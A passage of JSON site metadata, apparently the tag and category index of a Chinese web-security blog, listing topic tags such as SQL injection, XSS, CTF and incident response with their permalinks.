k":"https://wolke.cn/categories/%E6%96%B9%E5%90%91%E9%9D%B6%E5%9C%BA/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/categories/CTF/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"Go","slug":"Go","permalink":"https://wolke.cn/tags/Go/"},{"name":"Nexus","slug":"Nexus","permalink":"https://wolke.cn/tags/Nexus/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://wolke.cn/tags/SpringBoot/"},{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"薅羊毛","slug":"薅羊毛","permalink":"https://wolke.cn/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"},{"name":"信息收集","slug":"信息收集","permalink":"https://wolke.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"子域名爆破","slug":"子域名爆破","permalink":"https://wolke.cn/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://wolke.cn/tags/BurpSuite/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://wolke.cn/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"Ueditor","slug":"Ueditor","permalink":"https://wolke.cn/tags/Ueditor/"},{"name":".NET","slug":"NET","permalink":"https://wolke.cn/tags/NET/"},{"name":"Hikvison","slug":"Hikvison","permalink":"https://wolke.cn/tags/Hikvison/"},{"name":"DNSlog","slug":"DNSlog","permalink":"https://wolke.cn/tags/DNSlog/"},{"name":"验证码","slug":"验证码","permalink":"https://wolke.cn/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://wolke.cn/tags/OpenSSL/"},{"name":"Kali","slug":"Kali","permalink":"https://wolke.cn/tags/Kali/"},{"name":"phpMyAdmin","slug":"phpMyAdmin","permalink":"https://wolke.cn/tags/phpMyAdmin/"},{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQ技术","slug":"QQ技术","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"},{"name":"中间件漏洞","slug":"中间件漏洞","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"IIS","slug":"IIS","permalink":"https://wolke.cn/tags/IIS/"},{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"},{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"日志分析","slug":"日志分析","permalink":"https://wolke.cn/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"name":"逆向","slug":"逆向","permalink":"https://wolke.cn/tags/%E9%80%86%E5%90%91/"},{"name":"路由器","slug":"路由器","permalink":"https://wolke.cn/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"},{"name":"CMS","slug":"CMS","permalink":"https://wolke.cn/tags/CMS/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"},{"name":"Redis","slug":"Redis","permalink":"https://wolke.cn/tags/Redis/"},{"name":"内网安全","slug":"内网安全","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"},{"name":"Xray","slug":"Xray","permalink":"https://wolke.cn/tags/Xray/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://wolke.cn/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"name":"RCE","slug":"RCE","permalink":"https://wolke.cn/tags/RCE/"},{"name":"中间件","slug":"中间件","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"SSRF","slug":"SSRF","permalink":"https://wolke.cn/tags/SSRF/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"},{"name":"深度学习","slug":"深度学习","permalink":"https://wolke.cn/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"},{"name":"爬虫","slug":"爬虫","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"},{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"SMB","slug":"SMB","permalink":"https://wolke.cn/tags/SMB/"},{"name":"UQCMS","slug":"UQCMS","permalink":"https://wolke.cn/tags/UQCMS/"},{"name":"FTP","slug":"FTP","permalink":"https://wolke.cn/tags/FTP/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"},{"name":"命令执行","slug":"命令执行","permalink":"https://wolke.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"移动安全","slug":"移动安全","permalink":"https://wolke.cn/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"Android","slug":"Android","permalink":"https://wolke.cn/tags/Android/"},{"name":"sqlilabs","slug":"sqlilabs","permalink":"https://wolke.cn/tags/sqlilabs/"},{"name":"古典密码","slug":"古典密码","permalink":"https://wolke.cn/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"Web","slug":"Web","permalink":"https://wolke.cn/tags/Web/"}]}